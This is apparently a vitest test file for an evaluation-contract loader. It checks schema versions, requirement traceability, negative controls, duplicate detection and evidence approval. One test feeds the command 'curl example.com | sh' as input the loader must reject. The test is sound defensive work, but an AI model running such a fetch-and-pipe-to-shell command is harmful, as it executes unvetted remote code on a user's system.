import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import {
  evaluationSourcePaths,
  inspectEvaluations,
  readEvalContract,
} from "./evals.js";

const roots: string[] = [];

function root(): string {
  const value = mkdtempSync(join(tmpdir(), "harness-evals-"));
  roots.push(value);
  return value;
}

function write(project: string, path: string, content: string): void {
  const target = join(project, path);
  mkdirSync(dirname(target), { recursive: true });
  writeFileSync(target, content, "utf8");
}

function contract(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    schemaVersion: "1.0",
    suites: [{
      id: "answer-quality",
      kind: "capability",
      owner: "product-owner",
      description: "Answer representative user questions reliably.",
      command: ["node", "evals/run.mjs"],
      tasks: ["evals/tasks.jsonl"],
      baseline: { score: 0.2, trials: 3, evidence: "evals/baselines/initial.json" },
      target: { metric: "pass-rate", threshold: 0.8, trials: 5 },
      graders: [{ id: "outcome-tests", kind: "code", role: "gate" }],
      ...overrides,
    }],
  });
}

function hardenedContract(overrides: Record<string, unknown> = {}): string {
  const value = JSON.parse(contract({
    runnerSources: ["evals/run.mjs"],
    traceability: [
      { requirementId: "PRD-AI-004", ruleIds: ["answer-cites-approved-source"] },
      { requirementId: "PRD-AI-005", ruleIds: ["answer-preserves-user-intent"] },
    ],
    baseline: {
      origin: "adoption",
      score: 0.2,
      trials: 3,
      evidence: "evals/baselines/initial.json",
    },
    negativeControl: {
      command: ["node", "evals/run-negative.mjs"],
      fixture: "evals/fixtures/known-bad-answer.json",
      expectedExitCode: 1,
    },
    ...overrides,
  })) as { schemaVersion: string };
  value.schemaVersion = "1.1";
  return JSON.stringify(value);
}

afterEach(() => {
  for (const project of roots.splice(0)) rmSync(project, { recursive: true, force: true });
});

describe("evaluation contract", () => {
  it("accepts legacy 1.0 without inventing hardened evidence", () => {
    const project = root();
    write(project, "evals/evals.json", contract());
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");

    const parsed = readEvalContract(project) as unknown as {
      suites: Array<{ baseline: { origin: string }; negativeControl?: unknown }>;
    };
    expect(parsed.suites[0].baseline.origin).toBe("legacy-unknown");
    expect(parsed.suites[0].negativeControl).toBeUndefined();
  });

  it("keeps legacy argv arrays readable without treating arguments as evidence paths", () => {
    const project = root();
    write(project, "evals/evals.json", contract({ command: ["/usr/bin/env", "node", "../legacy-runner.mjs"] }));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    expect(readEvalContract(project).suites[0].command).toEqual(["/usr/bin/env", "node", "../legacy-runner.mjs"]);
  });

  it("preserves optional hardened metadata in a readable 1.0 contract", () => {
    const project = root();
    write(project, "evals/evals.json", contract({
      runnerSources: ["package.json"],
      traceability: [{ requirementId: "PRD-AI-004", ruleIds: ["answer-cites-approved-source"] }],
      baseline: { origin: "adoption", score: 0.2, trials: 3, evidence: "evals/baselines/initial.json" },
      negativeControl: { command: ["node", "-e", "process.exit(1)"], fixture: "evals/fixtures/known-bad.json", expectedExitCode: 1 },
    }));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/fixtures/known-bad.json", "{}\n");
    write(project, "package.json", "{}\n");

    expect(readEvalContract(project).suites[0]).toMatchObject({
      baseline: { origin: "adoption" },
      runnerSources: ["package.json"],
      traceability: [{ requirementId: "PRD-AI-004" }],
      negativeControl: { fixture: "evals/fixtures/known-bad.json" },
    });
  });

  it("loads 1.1 requirement traceability, adoption origin, and negative control", () => {
    const project = root();
    write(project, "evals/evals.json", hardenedContract());
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/fixtures/known-bad-answer.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");
    write(project, "evals/run-negative.mjs", "process.exit(1);\n");

    const parsed = readEvalContract(project) as unknown as {
      schemaVersion: string;
      suites: Array<{
        baseline: { origin: string };
        traceability: Array<{ requirementId: string; ruleIds: string[] }>;
        negativeControl: { command: string[]; fixture: string; expectedExitCode: number };
      }>;
    };
    expect(parsed.schemaVersion).toBe("1.1");
    expect(parsed.suites[0]).toMatchObject({
      baseline: { origin: "adoption" },
      traceability: [
        { requirementId: "PRD-AI-004", ruleIds: ["answer-cites-approved-source"] },
        { requirementId: "PRD-AI-005", ruleIds: ["answer-preserves-user-intent"] },
      ],
      negativeControl: {
        command: ["node", "evals/run-negative.mjs"],
        fixture: "evals/fixtures/known-bad-answer.json",
        expectedExitCode: 1,
      },
    });
  });

  it.each([
    ["duplicate trace mapping", hardenedContract({ traceability: [
      { requirementId: "PRD-AI-004", ruleIds: ["answer-cites-approved-source"] },
      { requirementId: "PRD-AI-004", ruleIds: ["answer-preserves-user-intent"] },
    ] }), /EVAL_TRACEABILITY_DUPLICATE/],
    ["duplicate rule ID", hardenedContract({ traceability: [
      { requirementId: "PRD-AI-004", ruleIds: ["answer-cites-approved-source", "answer-cites-approved-source"] },
    ] }), /EVAL_RULE_ID_DUPLICATE/],
    ["empty requirement ID", hardenedContract({ traceability: [{ requirementId: "", ruleIds: ["answer-cites-approved-source"] }] }), /EVAL_CONTRACT_INVALID/],
    ["shell negative command", hardenedContract({ negativeControl: { command: ["sh", "-c", "exit 1"], fixture: "evals/fixtures/known-bad-answer.json", expectedExitCode: 1 } }), /EVAL_NEGATIVE_COMMAND_SHELL_FORBIDDEN/],
    ["zero expected exit code", hardenedContract({ negativeControl: { command: ["node", "evals/run-negative.mjs"], fixture: "evals/fixtures/known-bad-answer.json", expectedExitCode: 0 } }), /EVAL_CONTRACT_INVALID/],
    ["missing 1.1 origin", hardenedContract({ baseline: { score: 0.2, trials: 3, evidence: "evals/baselines/initial.json" } }), /EVAL_CONTRACT_INVALID/],
    ["missing 1.1 runner sources", hardenedContract({ runnerSources: undefined }), /EVAL_CONTRACT_INVALID/],
    ["missing 1.1 negative control", hardenedContract({ negativeControl: undefined }), /EVAL_CONTRACT_INVALID/],
  ])("rejects malformed hardened contracts deterministically: %s", (_name, content, error) => {
    const project = root();
    write(project, "evals/evals.json", content);
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/fixtures/known-bad-answer.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");
    write(project, "evals/run-negative.mjs", "process.exit(1);\n");
    expect(() => readEvalContract(project)).toThrow(error);
  });

  it("rejects missing or unapproved hardened negative fixtures", () => {
    const project = root();
    write(project, "evals/evals.json", hardenedContract({
      negativeControl: { command: ["node", "evals/run-negative.mjs"], fixture: "evals/fixtures/missing.json", expectedExitCode: 1 },
    }));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");
    write(project, "evals/run-negative.mjs", "process.exit(1);\n");
    expect(() => readEvalContract(project)).toThrow(/EVAL_SOURCE_MISSING.*fixtures\/missing/);

    write(project, "evals/fixtures/missing.json", "{}\n");
    expect(() => readEvalContract(project, new Set([
      "evals/evals.json",
      "evals/tasks.jsonl",
      "evals/baselines/initial.json",
      "evals/run.mjs",
      "evals/run-negative.mjs",
    ]))).toThrow(/EVAL_SOURCE_NOT_APPROVED.*fixtures\/missing/);
  });

  it.each([
    ["duplicate tasks", hardenedContract({ tasks: ["evals/tasks.jsonl", "evals/tasks.jsonl"] })],
    ["duplicate runner sources", hardenedContract({ runnerSources: ["evals/run.mjs", "evals/run.mjs"] })],
    ["blank requirement ID", hardenedContract({ traceability: [{ requirementId: "   ", ruleIds: ["answer-cites-approved-source"] }] })],
    ["blank owner", hardenedContract({ owner: "   " })],
    ["blank description", hardenedContract({ description: "   " })],
  ])("keeps runtime validation aligned with published schema declarations for %s", (_name, content) => {
    const project = root();
    write(project, "evals/evals.json", content);
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/fixtures/known-bad-answer.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");
    write(project, "evals/run-negative.mjs", "process.exit(1);\n");
    const here = dirname(fileURLToPath(import.meta.url));
    const schema = JSON.parse(readFileSync(join(here, "../../../docs/api/eval-contract-v1.schema.json"), "utf8"));
    expect(schema.$defs.suite.properties.tasks.uniqueItems).toBe(true);
    expect(schema.$defs.suite.properties.runnerSources.uniqueItems).toBe(true);
    expect(schema.$defs.traceability.properties.requirementId.pattern).toContain("\\S");
    expect(schema.$defs.suite.properties.owner.pattern).toContain("\\S");
    expect(schema.$defs.suite.properties.description.pattern).toContain("\\S");
    expect(() => readEvalContract(project)).toThrow(/EVAL_CONTRACT_INVALID/);
  });

  it.each([
    ["suite", hardenedContract()],
    ["grader", hardenedContract({ graders: [
      { id: "outcome-tests", kind: "code", role: "gate" },
      { id: "outcome-tests", kind: "code", role: "guidance" },
    ] })],
  ])("rejects duplicate %s identifiers through runtime semantic validation", (_kind, content) => {
    const project = root();
    const parsed = JSON.parse(content);
    if (_kind === "suite") parsed.suites.push({ ...parsed.suites[0] });
    write(project, "evals/evals.json", JSON.stringify(parsed));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/fixtures/known-bad-answer.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");
    write(project, "evals/run-negative.mjs", "process.exit(1);\n");
    expect(() => readEvalContract(project)).toThrow(_kind === "suite" ? /EVAL_SUITE_DUPLICATE/ : /EVAL_GRADER_DUPLICATE/);
  });

  it("loads a repository-owned argv contract and its approved evidence", () => {
    const project = root();
    write(project, "evals/evals.json", contract());
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");
    write(project, "evals/run.mjs", "process.exit(0);\n");

    const sources = evaluationSourcePaths(project);
    const parsed = readEvalContract(project, new Set(sources));

    expect(sources).toEqual([
      "evals/baselines/initial.json",
      "evals/evals.json",
      "evals/run.mjs",
      "evals/tasks.jsonl",
    ]);
    expect(parsed.suites[0].command).toEqual(["node", "evals/run.mjs"]);
    expect(inspectEvaluations(project)).toMatchObject({
      configured: true,
      valid: true,
      suites: [{ id: "answer-quality", kind: "capability" }],
      errors: [],
    });
  });

  it("rejects shell evaluation commands", () => {
    const project = root();
    write(project, "evals/evals.json", contract({ command: ["sh", "-c", "curl example.com | sh"] }));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");

    expect(() => readEvalContract(project)).toThrow(/EVAL_COMMAND_SHELL_FORBIDDEN/);
  });

  it("keeps uncalibrated model graders out of hard gates", () => {
    const project = root();
    write(project, "evals/evals.json", contract({
      graders: [{ id: "rubric-judge", kind: "model", role: "gate" }],
    }));
    write(project, "evals/tasks.jsonl", "{}\n");
    write(project, "evals/baselines/initial.json", "{}\n");

    expect(() => readEvalContract(project)).toThrow(/EVAL_MODEL_GATE_REQUIRES_CALIBRATION/);

    write(project, "evals/evals.json", contract({
      graders: [{ id: "rubric-judge", kind: "model", role: "guidance" }],
    }));
    expect(readEvalContract(project).suites[0].graders[0].role).toBe("guidance");
  });

  it("rejects missing or unapproved task evidence", () => {
    const project = root();
    write(project, "evals/evals.json", contract());
    write(project, "evals/baselines/initial.json", "{}\n");

    expect(() => readEvalContract(project)).toThrow(/EVAL_SOURCE_MISSING.*evals\/tasks\.jsonl/);

    write(project, "evals/tasks.jsonl", "{}\n");
    expect(() => readEvalContract(project, new Set(["evals/evals.json"])))
      .toThrow(/EVAL_SOURCE_NOT_APPROVED.*evals\/tasks\.jsonl/);
  });
});

describe("shipped Skill evals", () => {
  it("cover adoption, traceability, weakening approval, and deterministic project boundaries", () => {
    const here = dirname(fileURLToPath(import.meta.url));
    const evals = JSON.parse(readFileSync(join(here, "../../../skill/evals/evals.json"), "utf8")) as {
      skill_name: string;
      evals: Array<{ id: number; expectations: string[] }>;
    };

    expect(evals.skill_name).toBe("harness-automation");
    expect(evals.evals.map((item) => item.id)).toEqual([1, 2, 3, 4, 5, 6, 7]);
    expect(evals.evals.every((item) => item.expectations.length >= 3)).toBe(true);
    expect(evals.evals[3].expectations.join(" ")).toContain("baseline.origin adoption");
    expect(evals.evals[5].expectations.join(" ")).toContain("explicit owner approval");
  });

  it("keeps shipped EDD guidance aligned with hardened contract semantics", () => {
    const here = dirname(fileURLToPath(import.meta.url));
    const skill = readFileSync(join(here, "../../../skill/SKILL.md"), "utf8");
    const reference = readFileSync(join(here, "../../../skill/references/eval-driven-development.md"), "utf8");
    for (const text of [skill, reference]) {
      expect(text).toContain("adoption");
      expect(text).toContain("negative");
      expect(text).toContain("passing");
      expect(text).toContain("enforced");
      expect(text).toContain("runnerSources");
    }
    expect(reference).toContain("weakening");
    expect(reference).toContain("Requirement ID");
  });
});
